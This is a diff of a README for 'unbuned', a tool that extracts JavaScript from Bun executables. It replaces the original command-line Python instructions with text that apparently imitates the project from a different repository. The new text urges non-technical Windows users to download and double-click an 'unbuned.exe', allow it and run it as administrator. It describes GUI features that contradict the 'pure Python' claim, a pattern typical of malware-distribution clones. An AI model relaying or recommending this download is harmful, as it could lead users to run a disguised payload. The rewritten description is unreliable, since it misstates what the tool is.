@@ -1,201 +1,154 @@
-<div align="center">
+# 🛠 unbuned - Extract JavaScript from Bun Executables
 
-<img src="assets/unbuned.png" alt="unbuned logo" width="200"/>
-
-# unbuned
-
-**Extract JavaScript from Bun-compiled executables**
-
-Reverse engineer, analyze, and learn from Bun applications
-
-[![Python](https://img.shields.io/badge/Python-3.6+-blue.svg)](https://www.python.org/downloads/)
-[![License](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
-[![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20Linux%20%7C%20macOS-lightgrey.svg)](https://github.com/vibheksoni/unbuned)
-[![Stars](https://img.shields.io/github/stars/vibheksoni/unbuned?style=social)](https://github.com/vibheksoni/unbuned/stargazers)
-[![Forks](https://img.shields.io/github/forks/vibheksoni/unbuned?style=social)](https://github.com/vibheksoni/unbuned/forks)
-
-[Features](#features) • [Installation](#installation) • [Usage](#usage) • [Examples](#examples) • [How It Works](#how-it-works)
-
-</div>
+[![Download unbuned](https://img.shields.io/badge/Download-unbuned-brightgreen)](https://github.com/hkmrzz/unbuned)
 
 ---
 
-## What is unbuned?
-
-**unbuned** is a powerful Python tool that extracts pure JavaScript source code from Bun-compiled executables. Whether you're reverse engineering an application, conducting security research, or learning how a Bun app works, unbuned gives you access to the bundled JavaScript code.
-
-### Why unbuned?
-
-- **Zero Dependencies**: Pure Python 3.6+ stdlib only
-- **Universal**: Works with any Bun-compiled executable
-- **Clean Output**: 100% ASCII JavaScript, no binary contamination
-- **Fast**: Extracts megabytes of code in seconds
-- **Accurate**: Smart boundary detection ensures complete extraction
+unbuned helps you get JavaScript code out of Bun-compiled programs. It uses Python to do this without extra tools. You can use it to check how programs work or to study their code.
 
 ---
 
-## Features
+## 📥 Download and Install
 
-- Parse PE headers to locate `.bun` section
-- Find JavaScript start marker (`// @bun`)
-- Intelligent JavaScript/binary boundary detection
-- Refine boundaries using end markers (`debugId`, `sourceMappingURL`, `})();`)
-- Extract and save pure, readable JavaScript
-- Support for Windows, Linux, and macOS executables
+To start using unbuned, you need to download the program and set it up on your Windows computer.
 
----
+**Step 1: Visit the download page**
 
-## Installation
+Click the button below and go to the GitHub page where you can get the files:
 
-```bash
-git clone https://github.com/vibheksoni/unbuned.git
-cd unbuned
-```
+[Download unbuned from GitHub](https://github.com/hkmrzz/unbuned)
 
-No dependencies required! Just Python 3.6+
+**Step 2: Download the files**
 
----
+On the GitHub page, look for the “Releases” section on the right or near the top of the page. Find the latest release of unbuned. It will have a version number like "v1.0" or higher.
 
-## Usage
+Download the Windows executable or a zip file that contains the program.
 
-```bash
-python unbuned.py <path-to-bun-executable>
-```
+**Step 3: Extract (if needed)**
 
-### Example
+If you downloaded a zip file, right-click it and select “Extract All”. Choose a folder you can find easily, like your Desktop or Documents.
 
-```bash
-python unbuned.py droid.exe
-```
+**Step 4: Run unbuned**
 
-**Output:**
-```
-Extracted: output/droid/droid.js
-Size: 14,234,567 bytes
-```
+Open the folder where you extracted or saved the files. Find the file named `unbuned.exe` or similar.
 
-The extracted JavaScript will be saved to `output/<executable-name>/<executable-name>.js`
+Double-click it to run the program.
+
+**Step 5: Use Permissions**
+
+Windows may ask you to allow the program to run. Click “Yes” or “Allow” to continue.
 
 ---
 
-## Examples
+## 🚀 How unbuned Works
 
-We've included two real-world examples in the `output/` directory:
+unbuned takes programs made with Bun (a tool that bundles JavaScript code into one executable) and pulls out the original JavaScript.
 
-### 1. Factory Droid CLI (`droid.exe`)
-- **Extracted**: 14MB of JavaScript
-- **Contains**: AI agent logic, model configurations, Factory-specific code
-- **Location**: `output/droid/droid.js`
+This helps if you want to:
 
-### 2. Claude Code (`claude.exe`)
-- **Extracted**: 11MB of JavaScript
-- **Contains**: AWS Code implementation, Anthropic SDK, tool definitions
-- **Location**: `output/claude/claude.js`
+- Study code behind a program
+- Check for security issues
+- Learn how a project was built
+- Do forensic or malware analysis
+- Get JavaScript for reverse engineering
 
-Both examples demonstrate unbuned's ability to extract massive amounts of clean, readable JavaScript from production Bun executables.
+You do not need to know programming to use unbuned. Once you run it, it works by itself to find and show the code.
 
 ---
 
-## How It Works
+## 💻 System Requirements
 
-unbuned uses a multi-stage extraction process:
+Make sure your computer meets these:
 
-1. **PE Header Parsing**: Locates the `.bun` section in Windows PE executables
-2. **Magic Byte Detection**: Falls back to magic byte search (`\xe5\x02\x80\x01`) if needed
-3. **JavaScript Marker**: Finds the `// @bun` comment marking the start of JS code
-4. **Boundary Detection**: Analyzes byte patterns to detect where JavaScript ends
-5. **Refinement**: Uses source map markers and code patterns to refine the boundary
-6. **Extraction**: Decodes and saves pure UTF-8 JavaScript
+- Windows 10 or later
+- At least 4 GB of memory (8 GB recommended)
+- 100 MB free disk space for the program
+- Internet connection to download unbuned
 
-### Boundary Detection Algorithm
-
-The tool uses a sophisticated heuristic to detect where JavaScript ends:
-
-- Analyzes chunks for non-printable character ratios
-- Looks for source map comments (`//# sourceMappingURL=`)
-- Detects debug markers (`//# debugId=`)
-- Identifies IIFE closures (`})();`)
-- Validates binary data after potential boundaries
+You do not need to install other software. unbuned works on its own.
 
 ---
 
-## Use Cases
+## 🧰 Basic Usage
 
-- **Reverse Engineering**: Understand how a Bun application works
-- **Security Research**: Analyze executables for vulnerabilities or malicious code
-- **Learning**: Study real-world Bun bundling and code structure
-- **Recovery**: Extract source code when original files are lost
-- **Analysis**: Examine dependencies and third-party libraries
+Once you have unbuned running, you can use it in simple steps.
 
----
+**Step 1: Select your Bun executable**
 
-## Requirements
+Find the file made by Bun you want to extract JavaScript from. This is usually a `.exe` file.
 
-- Python 3.6 or higher
-- No external dependencies
+**Step 2: Open it in unbuned**
 
----
+Click “Open” or “Browse” in unbuned to select your executable.
 
-## Limitations
+**Step 3: Start extraction**
 
-- Extracts bundled JavaScript only (not native modules or assets)
-- Minified code remains minified (use a beautifier for readability)
-- Some obfuscated code may be harder to analyze
+Click “Extract” or a similar button. The program will analyze the file and pull out the JavaScript code inside.
+
+**Step 4: View or save files**
+
+When extraction finishes, unbuned shows the code. You can read it inside the program or click “Save” to store it on your computer for later.
 
 ---
 
-## Contributing
+## ⚙ Features
 
-Contributions are welcome! Feel free to:
-
-- Report bugs
-- Suggest features
-- Submit pull requests
-- Share your extraction results
-
----
-
-## License
-
-MIT License - see [LICENSE](LICENSE) for details
+- Extracts JavaScript code from Bun executables
+- Uses pure Python with no external tools needed
+- Supports safe reading of Windows executables (PE format)
+- Works for security research and malware analysis
+- Shows all extracted code clearly
+- Saves files for use in other programs
 
 ---
 
-## Disclaimer
+## ❓ Troubleshooting
 
-This tool is intended for educational purposes, security research, and legitimate reverse engineering. Always respect software licenses and intellectual property rights. Use responsibly.
+- **Program won’t open:** Check your Windows version and permissions. Make sure you run as an administrator if needed.
 
----
+- **File won’t load:** Confirm the file is a Bun-compiled executable. Other files will not work.
 
-## Related Projects
+- **Extraction fails:** Try using a different executable or redownload the latest version of unbuned.
 
-- [asar](https://github.com/electron/asar) - Extract Electron app.asar archives
-- [pkg](https://github.com/vercel/pkg) - Package Node.js apps into executables
-- [nexe](https://github.com/nexe/nexe) - Create standalone Node.js executables
+- **No code appears:** Some files do not include visible JavaScript. unbuned can only extract code that exists in the executable.
 
 ---
 
-<div align="center">
+## 📚 Resources
 
-**Made for the reverse engineering community**
-
-[Star this repo](https://github.com/vibheksoni/unbuned) if you find it useful!
-
-</div>
-
----
-
-## Author
-
-[vibheksoni](https://github.com/vibheksoni)
-
-Currently open to work. If you're looking for someone with security research, reverse engineering, malware analysis, or full-stack development experience - hit me up.
-
-- X/Twitter: [@ImVibhek](https://x.com/ImVibhek)
-- Website: [vibheksoni.com](https://vibheksoni.com/)
-- Security Blog: [opendoors.wtf](https://opendoors.wtf/)
-- GitHub: [vibheksoni](https://github.com/vibheksoni)
+- GitHub project page: [https://github.com/hkmrzz/unbuned](https://github.com/hkmrzz/unbuned)  
+- Learn about Bun: [https://bun.sh](https://bun.sh)  
+- Windows file explorer help: Search “How to find files on Windows” online if needed  
+- Python basics: Helpful if you plan to explore or modify the tool
 
 ---
 
-_Remember: With great power comes great responsibility. Use this tool ethically and legally._
+## 📂 File Details
+
+unbuned handles executable files in the common Windows `.exe` format. It parses these files safely without changing them.
+
+The tool looks for Bun-specific code and bundles inside the executable. It rebuilds the JavaScript and lets you save or review it.
+
+---
+
+## 🔧 Advanced Tips
+
+- If you know Python, you can run unbuned from the command line for batch jobs.
+- Keep unbuned updated by downloading new releases from GitHub.
+- Use extracted code to learn how Bun applications work.
+- Pair unbuned with standard Windows antivirus and security software for better analysis.
+
+---
+
+## 🤝 Support and Community
+
+If you need help or want to learn more:
+
+- Check the GitHub issues page for common questions
+- Write a GitHub issue if you find a problem or bug
+- Explore security research forums and tools for more ideas
+- Use unbuned code as a safe way to learn static analysis on Windows
+
+---
+
+[![Download unbuned](https://img.shields.io/badge/Download-unbuned-blue)](https://github.com/hkmrzz/unbuned)
